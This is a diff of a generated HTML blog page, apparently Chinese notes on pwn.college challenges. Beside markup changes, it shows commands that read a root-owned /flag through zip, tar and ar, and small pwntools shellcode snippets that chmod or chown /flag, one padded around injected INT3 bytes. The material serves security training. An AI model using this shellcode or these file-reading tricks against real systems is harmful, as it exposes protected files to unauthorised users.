@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-27T15:11:27.144Z">
+<meta property="article:modified_time" content="2022-03-29T08:05:53.719Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -221,7 +221,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      386 分钟
+      387 分钟
     </span>
   
 
@@ -262,12 +262,12 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年3月27日 晚上
+                  不可视境界线最后变动于：2022年3月29日 下午
                 
               </p>
             
             <div class="markdown-body">
-              <h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><ul>
+              <ul>
 <li><p>连接</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li>
 <li><p>传文件到dojo或拉取</p>
@@ -296,7 +296,7 @@
 <li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some ELF properties.</li>
 <li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li>
 <li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li>
-<li><input disabled="" type="checkbox"> <strong>kaitai struct</strong> (<a target="_blank" rel="noopener" href="https://ide.kaitai.io/">https://ide.kaitai.io/</a>) to look through your ELF interactively</li>
+<li><input disabled="" type="checkbox"> <a target="_blank" rel="noopener" href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a> to look through your ELF interactively</li>
 </ul>
 </li>
 </ul>
@@ -493,30 +493,43 @@
 </li>
 <li><p>Auto-parentheses and auto-quotes (adapted from Nathan Gray’s LazyPython)</p>
 <ol>
-<li>Auto-parentheses Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::<div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3
+<li><p>Auto-parentheses</p>
+<p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p>
+<div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3
 </code></pre></div>
- and the input will be translated to this::<div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)
+<p> and the input will be translated to this::</p>
+<div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)
 </code></pre></div>
- This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>. You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::<div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;
+<p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p>
+<p> You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::</p>
+<div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;
 </code></pre></div>
- Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::<div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error
+<p> Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::</p>
+<div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error
 </code></pre></div>
- In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::<div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work
+<p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p>
+<div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work
 </code></pre></div>
- but this will work::<div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6)
+<p> but this will work::</p>
+<div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6)
  ------&gt; zip ((1,2,3),(4,5,6))
  Out[2]= [(1, 4), (2, 5), (3, 6)]
 </code></pre></div>
-IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::<div class="hljs code-wrapper"><pre><code> In [18]: callable list
+<p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::</p>
+<div class="hljs code-wrapper"><pre><code> In [18]: callable list
  -------&gt; callable (list)
 </code></pre></div>
 </li>
-<li><mark>Auto-Quoting</mark>  You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::<div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)
+<li><p><mark>Auto-Quoting</mark> </p>
+<p> You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::</p>
+<div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)
 </code></pre></div>
- If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::<div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)
+<p> If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::</p>
+<div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)
   In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)
 </code></pre></div>
- Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::<div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error
+<p> Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::</p>
+<div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error
 </code></pre></div>
 </li>
 </ol>
@@ -629,7 +642,7 @@ IPython tells you that it has altered your command line by<br>displaying the new
 </li>
 <li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p>
 </li>
-<li><p><code>tar cf flag.tar flag</code> then <code>tar  -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上.f参数后紧跟文件名</p>
+<li><p><code>tar cf flag.tar flag</code> then <code>tar -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上.f参数后紧跟文件名</p>
 </li>
 <li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> 发现经过root用户创建完archive之后直接就对其他用户可读了…更简单了</p>
 </li>
@@ -928,17 +941,21 @@ IPython tells you that it has altered your command line by<br>displaying the new
 <p>找了半天, 只有个chmod能用, 居然刚好18字节, 真绝啊. 一开始想着读取文件肯定是做不到的, 因为只能写到buffer上, 塞不下更多的逻辑了.  18个字节真的太少, 只能换一个方向而去改变他的权限, 然后就可以任意读取了.</p>
 <p>为了尽量节省空间, <code>&#39;/flag&#39;</code>放在了bytes的最后, 由起始地址addr计算出<code>/</code>的位置, 取代s1中9所在位置.</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    mov edi, 9</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pos = s1.find(<span class="hljs-string">&#x27;9&#x27;</span>)<br>s1 = s1[:pos] + <span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">12</span>) + s1[pos+<span class="hljs-number">1</span>:]<br>temp = asm(s1)<br>payload = payload + <span class="hljs-string">b&#x27;/flag&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
 <blockquote>
 <p>不一定要用这种替换, 可以使用<code>lea rdi, [rip+0x??]</code> , 或者下面这个chown系统调用.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lea rdi, [rip+f]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+f]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure>
 </blockquote>
 <p>13.同上, 而且变成0xc字节</p>
 <h2 id="9-被动修改"><a href="#9-被动修改" class="headerlink" title="9.被动修改"></a>9.被动修改</h2><blockquote>
 <p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure>
 
-<h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><p>11.同上, 关闭stdin</p>
+<h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><blockquote>
+<p>每8个字节作为一个64位无符号数, 使用冒泡排序升序排列. emmmmmm……</p>
+</blockquote>
+<p>11.同上, 关闭stdin</p>
 <h2 id="12-每个byte得unique"><a href="#12-每个byte得unique" class="headerlink" title="12.每个byte得unique"></a>12.每个byte得unique</h2><h2 id="14-只读6个字节"><a href="#14-只读6个字节" class="headerlink" title="14.只读6个字节"></a>14.只读6个字节</h2>
             </div>
             <hr>
